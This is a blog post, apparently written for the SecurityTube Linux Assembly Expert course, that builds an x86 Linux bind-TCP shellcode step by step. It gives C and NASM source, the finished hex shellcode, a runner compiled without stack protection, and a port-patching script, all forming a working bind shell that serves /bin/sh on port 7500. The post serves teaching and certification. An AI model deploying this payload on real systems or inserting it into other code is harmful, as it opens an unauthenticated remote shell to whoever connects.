---
comments: true
date: 2014-04-03
layout: blog
title: 'SLAE Assignment 1: Bind TCP Shellcode'
category: blog
image: /images/header_images/slaelogo.png
tags: [asm-x86,nasm,slae]
---

This is the first of the seven assignment necessary to accomplish the [SecurityTube Linux Assembly Expert](http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/index.html) certification. The instructions for this assignment are:

  1. Create a shellcode that bind to a specific port;

  2. The shellcode must execute /bin/sh on incoming connection;
	
  3. The port number should be easily configurable

First of all i made a proof of concept of a program that bind to a port (7500) and execute `/bin/sh` on the accepted connection. I used dup2 to makes 0, 1 and 2 (stdin, stdout and stderr) be the copy of newfd.

```c    
#define STDIN 0
#define STDOUT 1
#define STDERR 2

int main(void){
	int fd, newfd;
	struct sockaddr_in server_addr;
	char *argv[] = { "/bin/sh", NULL };

	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(7500);
	server_addr.sin_addr.s_addr = htonl(INADDR_ANY);

	fd = socket(AF_INET, SOCK_STREAM, 0);

	bind(fd, (struct sockaddr *) &server_addr, 16);

	listen(fd, 1);

	newfd = accept(fd, NULL, NULL);

	//dup2 (0,1,2) (client will be connected to stdin, stdout and stderr)
	dup2(newfd, STDIN);
	dup2(newfd, STDOUT);
	dup2(newfd, STDERR);

	execve(argv[0], &argv[0], NULL);

	return 0;
}
```

As you can see in the above PoC, in our shellcode we'll need these syscall:

  1. four `sys_socketcall(int call, unsigned long *args)` where int call will be `SYS_SOCKET`, `SYS_BIND`, `SYS_LISTEN` and `SYS_ACCEPT` according to `/usr/include/linux/net.h`;
	
  2. three `sys_dup2(int oldfd, int newfd)`;
	
  3. one `sys_execve(char *filename, char *argv[], char *envp[])` where both `*argv[] and *envp[]` must be null terminated;
  
  4. The last thing i checked (using strace) before start to code is how `(struct sockaddr *) &server_addr` is passed to the syscall.

[![Strace output]({{ site.baseurl }}/images/2014/04/strace_ass1-1024x566.png)]({{ site.baseurl }}/images/2014/04/strace_ass1.png)

The green rectangle translated in pseudo-assembly code become:

  1. `push sin_addr`
	
  2. `push sin_port`
	
  3. `push sa_family`
	
  4. `mov ecx,esp`
	
  5. `push 16`
	
  6. `push ecx`
	
  7. `push newfd`

  8. `mov ecx,esp` now ecx contains the address of `(3, {sa_family, sin_port, sin_addr}, 16)`

And below there is the complete shellcode:

```nasm    
;Description:	Assignment #1 (Shell_Bind_TCP, 93 bytes)
;Shellcode:		\x31\xd2\x31\xdb\x6a\x66\x58\x43\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x96\xb0\x66\x43\x52\x66\x68\x1d\x4c\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\x43\x43\x6a\x01\x56\x89\xe1\xcd\x80\xb0\x66\x43\x52\x52\x56\x89\xe1\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80
;Author: 		Paolo Stivanin <https://github.com/polslinux>
;SLAE ID:		526

global _start
section .text
_start:
	;socket(): sys_socketcall(int call, unsigned long *args)
	;eax -> sys_socketcall
	;ebx -> SYS_{SOCKET(1),BIND(2),CONNECT(3),LISTEN(4),ACCEPT(5) /usr/include/linux/net.h}
	;ecx -> args(AF_INET{/usr/include/bits/socket.h -> 2}, SOCK_STREAM{/usr/include/bits/socket_type.h -> 1}, 0)
	xor edx,edx
	xor ebx,ebx
	push BYTE 0x66 	;sys_socketcall
	pop eax
	inc ebx			;SYS_SOCKET
	push edx		;0
	push BYTE 1 	;SOCK_STREAM
	push BYTE 2		;AF_INET
	mov ecx,esp
	int 0x80
	xchg esi,eax

	;bind(): sys_socketcall(int call, unsigned long *args)
	;eax -> sys_socketcall
	;ebx -> SYS_BIND
	;ecx -> args(sockfd{esi}, {sa_family{2},sin_port{7500},sin_addr{0.0.0.0}}, socklen_t addrlen{16 bytes})
	mov BYTE al,0x66
	inc ebx			;SYS_BIND
	push edx
	push WORD 0x4C1D; por 7500
	push bx
	mov ecx,esp
	push BYTE 16
	push ecx
	push esi
	mov ecx,esp
	int 0x80

	;listen(): sys_socketcall(int call, unsigned long *args)
	;eax -> sys_socketcall
	;ebx -> SYS_LISTEN
	;ecx -> args(sockfd, backlog)
	mov BYTE al,0x66
	inc ebx
	inc ebx			;SYS_LISTEN
	push BYTE 1
	push esi
	mov ecx,esp
	int 0x80

	;accept: sys_socketcall(int call, unsigned long *args)
	;eax -> sys_socketcall
	;ebx -> SYS_ACCEPT
	;ecx -> args(sockfd, NULL, NULL)
	mov BYTE al,0x66
	inc ebx			;SYS_ACCEPT
	push edx
	push edx
	push esi
	mov ecx,esp
	int 0x80

	;dup2 sys_dup2(oldfd, newfd{0[stdin],1[stdout],2[stderr]})
	xchg ebx,eax
	push BYTE 2
	pop ecx
lp:	mov BYTE al,0x3f
	int 0x80
	dec ecx
	jns lp			;SF=0 positive, SF=1 negative. JNS (jump-if-not-sign) will loop while SF=0. When SF is set we reach a negative value so the loop stops.		

	;execve /bin/sh
	mov BYTE al,11
	push edx
	push 0x68732f2f
	push 0x6e69622f
	mov ebx,esp
	push edx
	mov edx,esp
	push ebx
	mov ecx,esp
	int 0x80
```

I also used [libemu](http://libemu.carnivore.it/) and dot to produce a graph of the execution flow of the shellcode:

[![graph_assign1]({{ site.baseurl }}/images/2014/04/graph_assign1-433x1024.png)]({{ site.baseurl }}/images/2014/04/graph_assign1.png)

After that I used the following script to assemble, link and get the shellcode in hex format.

```sh
#!/bin/bash

#Author:	Paolo Stivanin <https://github.com/polslinux>
#SLAE ID:	526

if [ -z "$1" ];then
	echo "Usage: $0 filename"
	exit -1
fi

FILE_NO_EXT="${1%.*}"

echo "[+] Assembling with NASM..."
nasm -f elf32 -o "${FILE_NO_EXT}.o" "$1"

echo "[+] Linking..."
if [ $(uname -m) == "x86_64" ]; then
	ld  -m elf_i386 -o ${FILE_NO_EXT} ${FILE_NO_EXT}.o
else
	ld -o ${FILE_NO_EXT} ${FILE_NO_EXT}.o
fi

echo "[+] Shellcode:"
for i in $(objdump -d ${FILE_NO_EXT} |grep "^ " |cut -f2); do echo -n '\x'$i; done; echo
```

The output of the script is:

```c   
"\x31\xd2\x31\xdb\x6a\x66\x58\x43\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x96\xb0\x66\x43\x52\x66\x68\x1d\x4c\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\x43\x43\x6a\x01\x56\x89\xe1\xcd\x80\xb0\x66\x43\x52\x52\x56\x89\xe1\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80"
```

Before executing the shellcode the above result must be put inside the following C file.

```c    
/* Template for running shellcode
 * Author: Paolo Stivanin <https://github.com/polslinux>
 * SLAE Student ID: 526
 */

#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = \
"\x31\xd2\x31\xdb\x6a\x66\x58\x43\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x96\xb0\x66\x43\x52\x66\x68\x1d\x4c\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\x43\x43\x6a\x01\x56\x89\xe1\xcd\x80\xb0\x66\x43\x52\x52\x56\x89\xe1\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80";

int main(void){
	printf("%zu\n", strlen(shellcode));
	int (*ret)() = (int(*)())shellcode;
	ret();
	return 0;
}
```

Now it's time to compile the file with `gcc -fno-stack-protector -z execstack main.c -o Shell_Bind_TCP` (or with [this](https://github.com/polslinux/SLAE/blob/master/utility/for-shellcode/compile_gcc.sh) script) and then run it with `./Shell_Bind_TCP`.

To test the shellcode you just need to open a new terminal and type `nc localhost 7500` and...you're in :-)

[![res_ass1]({{ site.baseurl }}/images/2014/04/res_ass1-1024x575.png)]({{ site.baseurl }}/images/2014/04/res_ass1.png)

The last point of this assignment ask to provide a way to easily configure the port number. To accomplish this request I developed this small script:

```sh    
#!/bin/bash

#Description:	Assignment #1 (Shell_Bind_TCP, configure port)
#Author: 		Paolo Stivanin <https://github.com/polslinux>
#SLAE ID:		526

if [ -z "$1" ]; then
	echo "Usage: $0 <elf-file>"
	exit -1
fi

oldport=$(od -t x1 $1|grep -o -P "66 68.{6}"|sed 's/\(......\)//g'|sed 's/\ //g')
hexoldport=$(printf '%s' $oldport | sed 's/\(..\)/&\\x/' | sed 's/\(\)/&\\x/')

echo "--> Write port number: "
read port
hexport=$(printf '%x' $port)

echo "[+] HEX code of choosed port: $hexport"

echo "[+] Updating $1 elf..."
newport=$(printf '%s' $hexport | sed 's/\(..\)/&\\x/' | sed 's/\(\)/&\\x/')
sed -i "s/\x66\x68$hexoldport/\x66\x68$newport/g" $1

echo "[+] All done :)"
```

All the sources can be found in my [Github page](https://github.com/polslinux/SLAE/).

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: [http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

**Student ID: SLAE-526**
